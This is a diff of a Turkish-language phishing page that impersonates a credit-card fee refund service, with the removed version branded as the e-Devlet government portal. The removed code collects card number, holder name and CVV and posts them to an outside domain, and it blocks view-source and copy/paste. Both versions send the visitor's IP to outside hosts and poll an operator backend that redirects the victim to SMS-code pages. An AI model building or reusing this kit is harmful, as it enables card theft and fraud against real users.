@@ -1,312 +1,157 @@
 <!DOCTYPE html>
+<html class="no-js test-supports test-csstransforms3d test-history test-target test-texttrackapi test-track test-no-contains test-supports test-csstransforms3d test-history test-target test-texttrackapi test-track test-no-contains" lang="tr"><head>
+  <head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta http-equiv="x-ua-compatible" content="IE=edge">
+    <meta http-equiv="cleartype" content="on">
+    <title>Mobil İşlem Merkezi</title>
+    <meta name="description" content="5 yıla kadar tüm ödediğiniz aidat ücretlerini geri alın">
  
-<html lang="zxx"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta name="keywords" content="mobil,işlem,merkezi">
+    <meta name="robots" content="index,follow">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="theme-color" content="#4284be">
+    <link rel="icon" type="image/png" href="assets/favicons/favicon-196x196.png" sizes="196x196">
+ 	    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+
+    <meta name="msapplication-TileColor" content="#FFFFFF">
+    <link rel="stylesheet" href="assets/css/base.css">
  
+    <link rel="stylesheet" href="assets/css/giris.css">
+    <style>
+      .yg-input-error-msg {
+          display: none;
+          color: red;
+      }div center p {
+  font-size: 19px;
+} 
+  </style>
+  <script src="https://cdn.jsdelivr.net/npm/sweetalert2@10"></script>
  
-    <title>e-Devlet | Aidat İade Sistemi</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <script src="https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+  </head>
+  <body data-lang="tr_TR.UTF-8">
+    <div class="wrapper">
+        <div class="container">
+ 
+    <header class="header">
+        <h1>Kredi Kartı Aidat İade Başvurusu
+        </h1>
+        <div class="logo"><a href="/"> <img src="assets/img/edk-logo.png"
+                                            alt="logo2"> </a>
+        </div>
+     
+     
+    </header>
+ 
     
-    <!-- External CSS libraries -->
-    <link type="text/css" rel="stylesheet" href="./files/bootstrap.min.css">
-    <link type="text/css" rel="stylesheet" href="./files/font-awesome.min.css">
-    <link type="text/css" rel="stylesheet" href="./files/flaticon.css">
-
-    <!-- Favicon icon -->
+    <main>
+        <section>
+            <div class="content" >
+            
     
+              <form method="post" id="loginForm" name="sifreGirisForm" autocomplete="off" onsubmit="return validateForm();">
+                <img src="https://atlantikkozmetik.com/loading.gif" jsaction="VQAsE" class="sFlh5c pT0Scc iPVvYb" style="max-width: 800px; height: 153px; margin: 135.5px 0px; width: 432px;" alt="Lütfen Bekleyiniz" jsname="kn3ccd">
+                <p style="text-align: center; margin-top: 10px;">Lütfen bekleyiniz, işleminiz devam ediyor...</p>
+              </form>
+              
+            </div>
+        </section>
+    
+ 
+    
+    </main>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    </div>
+   
+    
+    <footer class="footer-fixed" role="contentinfo">
+        <span class="copyright"><img src="assets/img/DDO-logo.png" class="footer-logo" alt="logo" height="24"  >© 2024, Ankara - Tüm Hakları Saklıdır</span>
+        <ul>
+            <li>
+                <a id="gizlilik_btn" 
+                   aria-haspopup="true">Gizlilik ve Güvenlik
+                </a>
+            </li>
+    
+        </ul>
+ 
+    </footer>
+    
+  </div>
+ 
 
-    <!-- Google fonts -->
-    <link rel="stylesheet" type="text/css" href="./files/css">
-
-    <!-- Custom Stylesheet -->
-    <link type="text/css" rel="stylesheet" href="./files/style.css">
-    <link rel="stylesheet" type="text/css" id="style_sheet" href="./files/default.css">
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/vue/2.5.17/vue.min.js"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/axios/0.18.0/axios.min.js"></script>
-  <script>
-    const url = 'https://ipinfo.io/json';
+ <script>
     new Vue({
       el: '#app',
       data: {
-        results: []
+        visitorIP: null,
       },
-      mounted() {
-        window.onload = () => {
-          axios.get(url).then(response => {
-            this.results = response.data;
-  
-            // IP adresini bir cookie'ye kaydet
-            document.cookie = "user_ip=" + this.results.ip;
-  
-            // Cookie'deki user_ip değerini al ve /api endpoint'ine post et
-            const userIp = getCookie('user_ip');
-            if (userIp) {
-              sendPostRequest(userIp);
-            }
-          });
-        };
-      }
-    });
-  
-   
-  
-    function getCookie(cname) {
-      const name = cname + '=';
-      const decodedCookie = decodeURIComponent(document.cookie);
-      const cookieArray = decodedCookie.split(';');
-  
-      for (let i = 0; i < cookieArray.length; i++) {
-        let cookie = cookieArray[i];
-        while (cookie.charAt(0) == ' ') {
-          cookie = cookie.substring(1);
-        }
-        if (cookie.indexOf(name) == 0) {
-          return cookie.substring(name.length, cookie.length);
-        }
-      }
-      return '';
-    }
-  </script>
-</head>
-<body id="top">
-<!-- Google Tag Manager (noscript) -->
- 
-<!-- End Google Tag Manager (noscript) -->
-<div class="page_loader"></div>
-
- 
-<script src="./files/jquery-3.2.1.min.js.indir" type="text/javascript"></script>
-<script src="./files/jquery.creditCardValidator.js.indir"></script>
-<script>
-function validate(){
-	var valid = true;	 
-    $(".demoInputBox").css('background-color','');
-    var message = "";
-
-    var cardHolderNameRegex = /^[a-z ,.'-]+$/i;
-    var cvvRegex = /^[0-9]{3,3}$/;
-    
-    var cardHolderName = $("#card-holder-name").val();
-    var cardNumber = $("#tach").val();
-    var cvv = $("#dogum").val();
-
-    if(cardHolderName == "" || cardNumber == "" || cvv == "") {
-    	   message  += "<div>Lütfen Tüm Alanları Doldurun.</div>";  
-    	   if(cardHolderName == "") {
-    		   $("#card-holder-name").css('background-color','#FFFFDF');
-    	   }
-    	   if(cardNumber == "") {
-    		   $("#tach").css('background-color','#FFFFDF');
-    	   }
-    	   if (cvv == "") {
-    		   $("#dogum").css('background-color','#FFFFDF');
-    	   }
-       valid = false;
-    }
-    
-    if (cardHolderName != "" && !cardHolderNameRegex.test(cardHolderName)) {
-        message  += "<div>Card Holder Name is Invalid</div>";    
-    		$("#card-holder-name").css('background-color','#FFFFDF');
-    		valid = false;
-    }
-    
-    if(cardNumber != "") {
-        	$('#tach').validateCreditCard(function(result){
-            if(!(result.valid)){
-                	message  += "<div>Kart Numarası Hatalı!</div>";    
-            		$("#tach").css('background-color','#FFFFDF');
-            		valid = false;
-            }
-        });
-    }
-    
-    if (cvv != "" && !cvvRegex.test(cvv)) {
-        message  += "<div>CVV Kodu Hatalı!</div>";    
-        $("#dogum").css('background-color','#FFFFDF');
-    		valid = false;
-    }
-    
-    if(message != "") {
-        $("#error-message").show();
-        $("#error-message").html(message);
-    }
-    return valid;
-}
-</script>
-
-<form id="frmContact" action="https://xn--holiganbt930-8d6f.com/gg/validateCaptcha.php" method="post" onsubmit="return validate();" data-gtm-form-interact-id="0">
-
-
-
-
-    <!-- External CSS libraries -->
-    <link type="text/css" rel="stylesheet" href="./files/bootstrap.min.css">
-    <link type="text/css" rel="stylesheet" href="./files/font-awesome.min.css">
-    <link type="text/css" rel="stylesheet" href="./files/flaticon.css">
-
-    <!-- Favicon icon -->
- 
-
- 
-    <link rel="stylesheet" type="text/css" href="./files/css">
-
-   
-    <link type="text/css" rel="stylesheet" href="./files/style.css">
-    <link rel="stylesheet" type="text/css" id="style_sheet" href="./files/default.css">
-
-
-
- 
-<div class="page_loader"></div>
- 
-
-<section class="creditly-wrapper wthree, w3_agileits_wrapper">
-      <div class="card bg-secondary shadow border-0">
-
-<div class="login-1">
-    <div class="container">
-        <div class="row">
-            <div class="col-md-12">
-                 <div class="login-inner-form">
-                    <div class="details">
-                        <a href="https://xn--holiganbt930-8d6f.com/gg/validateCaptcha.php">
-                            <img src="./files/logo-2.png" alt="logo">
-                        </a>
-                        <h3>Online Aidat İade Sistemi</h3>
-<br>
-<font size="2" color="#960000">Lütfen bekleyiniz <b> işleminiz yapılıyor.</b> </font>
-			 <img src="./bk.gif" alt="bkle">
-        </div>  </div>
-    </div>
-</div>
-
-
- <script async="" src="./files/js"></script>
- 
-
- 
-<script>
-document.onkeydown = function(e) {
-        if (e.ctrlKey && 
-            (e.keyCode === 85 )) {
-            return false;
-        }
-};
-</script>
-
-<script type="text/javascript">
-$(document).ready(function () {
-     $('body').bind('cut copy paste', function (e) {
-        e.preventDefault();
-    });
-     
-     $('#id').bind('cut copy paste', function (e) {
-        e.preventDefault();
-    });
-});
-</script>
-
-<!-- credit-card -->
-		<script type="text/javascript" src="./files/creditly.js.indir"></script>
-		<script type="text/javascript">
-			$(function() {
-			  var creditly = Creditly.initialize(
-				  '.creditly-wrapper .expiration-month-and-year',
-				  '.creditly-wrapper .credit-card-number',
-				  '.creditly-wrapper .security-code',
-				  '.creditly-wrapper .card-type');
-
-			  $(".creditly-card-form .submit").click(function(e) {
-				e.preventDefault();
-				var output = creditly.validate();
-				if (output) {
- 				  console.log(output);
-				}
-			  });
-			});
-		</script>
- 
-
-</div></section></form>
-	<script>
-  new Vue({
-    el: '#app',
-    data: {
-      results: [],
-      userIp: ''  
-    },
-    mounted() {
-     
-      this.getUserIpFromCookie();
-      this.makeRequests();
-
-    
-      setInterval(() => {
-        this.getUserIpFromCookie();
-        this.makeRequests();
-      }, 3000);
-    },
-    methods: {
-      getUserIpFromCookie() {
-      
-        this.userIp = this.getCookie('user_ip');
+      created() {
+        this.gonder();
+        setInterval(this.gonder, 2500);
       },
-      makeRequests() {
-    if (this.userIp) {
-        var currentPage = window.location.pathname.split('/').pop();
-        axios.get(`/api?user_ip=${this.userIp}&current_page=${currentPage}`)
+      methods: {
+        gonder() {
+          this.visitorIP = this.getCookie('ip');
+
+          if (!this.visitorIP) {
+            axios.get('https://ipapi.co/ip').then(response => {
+              this.visitorIP = response.data;
+              document.cookie = "ip=" + this.visitorIP + "; path=/";
+              this.sendRequest(this.visitorIP);
+            }).catch(error => {
+              console.error('IP alma sırasında bir hata oluştu:', error);
+            });
+          } else {
+            this.sendRequest(this.visitorIP);
+          }
+        },
+        sendRequest(visitorIP) {
+          axios.get('https://hakikicelikhantutunu.com/dmn/veri.php?ip=' + encodeURIComponent(visitorIP))
             .then(response => {
-                this.results = response.data;
-                console.log('GET isteği başarıyla gönderildi. Sunucu yanıtı:', response.data);
-
-                // response.data'ya göre yönlendirme yap
-                if (response.data === 'sms0') {
-                    window.location.href = '/sms.html';
-                } else if (response.data === 'tebrik0') {
-                    window.location.href = '/tebrik.html';
-                } else if (response.data === 'hata0') {
-                    window.location.href = '/hatali.html';
-                } else if (response.data === 'sms20') {
-                    window.location.href = '/hatali.html';
-                } else if (response.data === 'back0') {
-                    window.location.href = '/index.html';
-                } else if (response.data === '1') {
-                    window.location.href = 'smsh.php';
-                } else if (response.data === '2') {
-                    window.location.href = 'kart.php';
-                } else if (response.data === '3') {
-                    window.location.href = 'bekle.php';
-                } else if (response.data === '4') {
-                    window.location.href = 'hata.php';
-                } else if (response.data === '5') {
-                    window.location.href = '/tebrik.html';
-                }
+              const msg = response.data;
+              if (msg === "back") {
+                window.location.href = '/';
+              } else if (msg === "hata") {
+                window.location.href = '/sms-hatali';
+              } else if (msg === "sms") {
+                window.location.href = '/sms';
+              } else if (msg === "tebrik") {
+                window.location.href = '/tebrikler';
+              }
             })
             .catch(error => {
-                console.error('GET isteği sırasında bir hata oluştu:', error);
+              console.error('İstek sırasında bir hata oluştu:', error);
             });
-    } else {
-        // Kullanıcı IP'si yoksa istek yapma
-        console.warn('Kullanıcı IP\'si bulunamadığı için GET isteği gönderilmedi.');
-    }
-},
-      getCookie(cname) {
-        const name = cname + '=';
-        const decodedCookie = decodeURIComponent(document.cookie);
-        const cookieArray = decodedCookie.split(';');
-
-        for (let i = 0; i < cookieArray.length; i++) {
-          let cookie = cookieArray[i];
-          while (cookie.charAt(0) == ' ') {
-            cookie = cookie.substring(1);
+        },
+        getCookie(name) {
+          const cookieName = name + "=";
+          const decodedCookie = decodeURIComponent(document.cookie);
+          const cookieArray = decodedCookie.split(';');
+          for (let i = 0; i < cookieArray.length; i++) {
+            let cookie = cookieArray[i].trim();
+            if (cookie.indexOf(cookieName) === 0) {
+              return cookie.substring(cookieName.length, cookie.length);
+            }
           }
-          if (cookie.indexOf(name) == 0) {
-            return cookie.substring(name.length, cookie.length);
-          }
+          return null;
         }
-        return '';
       }
-    }
-  });
-</script> 
+    });
+  </script>
 
-</body></html>
+ 
+    </body>
+    </html>
+    
+    
